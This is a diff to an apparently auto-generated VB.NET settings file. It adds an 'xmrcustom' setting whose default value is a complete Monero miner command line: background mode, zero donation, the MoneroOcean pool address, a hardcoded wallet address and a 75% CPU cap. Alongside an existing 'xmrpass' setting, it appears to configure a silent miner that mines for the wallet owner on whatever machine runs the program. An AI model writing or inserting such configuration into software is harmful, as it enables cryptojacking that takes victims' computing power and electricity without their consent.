@@ -293,6 +293,20 @@ Namespace My
                 Me("xmrpass") = value
             End Set
         End Property
+        
+        <Global.System.Configuration.UserScopedSettingAttribute(),  _
+         Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
+         Global.System.Configuration.DefaultSettingValueAttribute("-B --donate-level=0 -a cryptonight --url=gulf.moneroocean.stream:80 -u 49H8Kbf15J"& _ 
+            "FN2diG5evGHA5G49qhgFBuDid86z3MKxTv59dcqySCzFWUL3SgsEk2SufzTziHp3UE5P8BatwuyFuv1b"& _ 
+            "BKQw2 -p x -R --variant=-1 --max-cpu-usage=75")>  _
+        Public Property xmrcustom() As String
+            Get
+                Return CType(Me("xmrcustom"),String)
+            End Get
+            Set
+                Me("xmrcustom") = value
+            End Set
+        End Property
     End Class
 End Namespace
 
